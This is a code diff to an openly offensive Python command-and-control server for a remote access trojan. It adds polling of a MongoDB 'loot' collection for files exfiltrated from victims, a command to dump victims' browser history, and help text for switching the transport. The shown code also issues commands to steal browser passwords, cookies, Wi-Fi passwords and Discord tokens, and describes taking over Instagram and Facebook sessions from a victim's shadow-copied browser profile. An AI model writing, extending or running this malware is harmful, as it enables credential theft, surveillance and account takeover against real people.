@@ -89,7 +89,7 @@ class DatabaseManager:
     def __init__(self, db_path: str, mongodb_uri: str = None):
         self.db_path = db_path
         self.mongodb_uri = mongodb_uri or os.environ.get('MONGODB_URI')
-        self.use_mongo = bool(self.mongodb_uri)
+        self.use_mongo = False  # Start in normal (SQLite) mode by default
         
         if self.use_mongo:
             try:
@@ -397,6 +397,7 @@ class AdvancedC2Server:
         threading.Thread(target=self._audio_playback_loop, daemon=True).start()
         threading.Thread(target=self._poll_mongodb_results, daemon=True).start()
         threading.Thread(target=self._poll_mongodb_handshakes, daemon=True).start()
+        threading.Thread(target=self._poll_mongodb_loot, daemon=True).start()
 
         # Open TCP listener immediately only if NOT starting in Mongo mode
         if not self.db.use_mongo:
@@ -1345,6 +1346,72 @@ class AdvancedC2Server:
                 pass
             time.sleep(2)
 
+    def _poll_mongodb_loot(self):
+        """Poll MongoDB loot collection for files sent by clients and save them to disk.
+
+        The client writes loot (downloaded files, screenshots, etc.) to the MongoDB
+        'loot' collection with the file data base64-encoded in the 'data' field.
+        After processing each document we stamp it with server_processed=True so it
+        is never re-fetched — avoiding the spam caused by $nin / in-memory set tricks.
+        """
+        while self.running:
+            try:
+                if self.db.use_mongo and hasattr(self.db, 'db'):
+                    # Only fetch documents not yet handled by any server session
+                    cursor = self.db.db.loot.find(
+                        {"server_processed": {"$ne": True}}
+                    ).sort("timestamp", 1)
+
+                    for doc in cursor:
+                        doc_id   = doc.get('_id')
+                        cid      = doc.get('client_id', 'unknown')
+                        lt       = doc.get('type', 'file')
+                        fn       = doc.get('filename') or f"unnamed_{int(time.time())}"
+                        raw_data = doc.get('data', '')
+
+                        # Mark as processed FIRST so a crash mid-write doesn't replay it
+                        self.db.db.loot.update_one(
+                            {"_id": doc_id},
+                            {"$set": {"server_processed": True}}
+                        )
+
+                        # Decode base64 data back to bytes
+                        try:
+                            data_bytes = base64.b64decode(raw_data) if raw_data else b''
+                        except Exception:
+                            data_bytes = raw_data.encode() if isinstance(raw_data, str) else b''
+
+                        # Write to disk under loot/<client_id>/<type>/
+                        # NOTE: do NOT call self.db.save_loot() here — in mongo mode
+                        # save_loot() does insert_one() back into the loot collection,
+                        # which would create a new unprocessed doc and loop forever.
+                        # The data is already persisted in MongoDB; we only need the file.
+                        loot_path = Path(self.config.loot_dir) / cid / lt
+                        loot_path.mkdir(parents=True, exist_ok=True)
+                        fpath = loot_path / fn
+                        try:
+                            with open(fpath, 'wb') as f:
+                                f.write(data_bytes)
+                            fpath_str = str(fpath)
+                        except Exception as write_err:
+                            self.logger.error(f"[LootPoll] Failed to write {fn}: {write_err}")
+                            fpath_str = f"db://loot/{fn}"
+                            
+                        # Record in local SQLite DB for the GUI
+                        try:
+                            self.db.execute(
+                                "INSERT INTO loot (client_id, type, filename, path, size, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+                                (cid, lt, fn, fpath_str, len(data_bytes), doc.get('timestamp', datetime.datetime.now().isoformat()))
+                            )
+                        except Exception as sqlite_err:
+                            self.logger.error(f"[LootPoll] Failed to record in SQLite: {sqlite_err}")
+
+                        self.logger.success(f"[LootPoll] LOOT from {cid}: {fn} ({lt}) → {fpath_str}")
+            except Exception as e:
+                self.logger.error(f"[LootPoll] Error: {e}")
+            time.sleep(3)
+
+
 
     def _command_loop(self):
         while self.running:
@@ -1356,6 +1423,7 @@ class AdvancedC2Server:
                 line = input(prompt).strip()
                 if line: self.parser.parse(line)
             except (EOFError, KeyboardInterrupt): break
+
 
 class CommandParser:
     def __init__(self, server: AdvancedC2Server): 
@@ -1455,6 +1523,7 @@ class CommandParser:
             # --- Credentials ---
             elif cmd == 'passwords': self.server.send_command(targets, 'browser_passwords')
             elif cmd == 'cookies': self.server.send_command(targets, 'browser_cookies')
+            elif cmd == 'history': self.server.send_command(targets, 'browser_history', {'limit': int(args[0]) if args else 1000})
             elif cmd == 'wifi': self.server.send_command(targets, 'wifi_passwords')
             elif cmd == 'chromelevator': self.server.send_command(targets, 'chromelevator')
             
@@ -1646,7 +1715,7 @@ class CommandParser:
         except Exception as e: print(f"Upload failed: {e}")
 
     def _show_clients(self):
-        print(f"\n{Fore.YELLOW}{'ID':<18} {'IP':<15} {'System':<20} {'User':<15}{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}{'ID':<18} {'IP / Mode':<18} {'System':<20} {'User':<15}{Style.RESET_ALL}")
         print("-" * 75)
         with self.server.client_lock:
             for cid, info in self.server.clients.items():
@@ -1655,7 +1724,13 @@ class CommandParser:
                 h = s.get('hostname') or s.get('node') or '?'
                 o = s.get('platform') or s.get('os') or '?'
                 u = s.get('username') or s.get('user') or '?'
-                print(f"{cid:<18} {info['addr'][0]:<15} {o[:20]:<20} {u:<15}")
+                
+                # Determine mode for display
+                ip_addr = info['addr'][0]
+                is_mongo = info.get('mongo_transport', False)
+                mode_str = f"{ip_addr} [M]" if is_mongo else f"{ip_addr} [T]"
+                
+                print(f"{cid:<18} {mode_str:<18} {o[:20]:<20} {u:<15}")
         print()
     def _show_help(self):
         W  = Style.RESET_ALL
@@ -1679,6 +1754,26 @@ class CommandParser:
   {G}clear{W}                Clear the terminal screen
   {G}exit{W}                 Shut down the C2 server entirely
   {G}dbmode <mongo|normal>{W} Switch database dynamically (MongoDB Atlas vs SQLite)
+  {G}dbmode{W}               (no args) Print the current database mode
+  {G}dbmode_client <normal|mongo>{W}   Tell the connected client to switch its transport mode
+
+{Y}╔══════════════════════════════════════╗
+║        SWITCHING MODES (DB ↔ NORMAL) ║
+╚══════════════════════════════════════╝{W}
+  {C}To switch from MongoDB back to Normal (SQLite/TCP):{W}
+    1. {G}dbmode normal{W}        — Server switches to SQLite + re-opens TCP listener
+    2. {G}dbmode_client normal{W} — Tells client(s) to stop polling MongoDB and
+                             reconnect via TCP
+
+  {C}To switch from Normal (TCP) to MongoDB:{W}
+    1. {G}dbmode mongo{W}         — Server switches to MongoDB Atlas + closes TCP listener
+    2. {G}dbmode_client mongo{W}  — Tells client(s) to stop TCP and start polling MongoDB
+
+  {C}Tips:{W}
+    • Run {G}select <id>{W} first to target a single client, otherwise
+      dbmode_client broadcasts to ALL connected clients.
+    • Run {G}dbmode{W} (no args) anytime to check the current active mode.
+    • Ensure MONGODB_URI is set in your .env before switching to mongo mode.
 
 {Y}╔══════════════════════════════════════╗
 ║        EXECUTION                     ║
@@ -1755,6 +1850,9 @@ class CommandParser:
                        App-Bound Encryption (v20+). Opens headless browser with victim's
                        profile shadow-copied. Best for Instagram/Facebook session cookies.
                        Ex: cookies live https://www.instagram.com
+  {G}history [limit]{W}      Dump browser history from Chrome, Edge, Brave, Opera, Opera GX.
+                       Optionally specify history entries limit (default 1000).
+                       Output: JSON loot file with URL, title, visits, last visit time.
   {G}wifi{W}                 Extract all saved Wi-Fi SSIDs and plaintext passwords.
                        Windows: netsh wlan. Linux: NetworkManager files / nmcli.
   {G}discord{W}              Steal Discord auth tokens from Local Storage (leveldb).
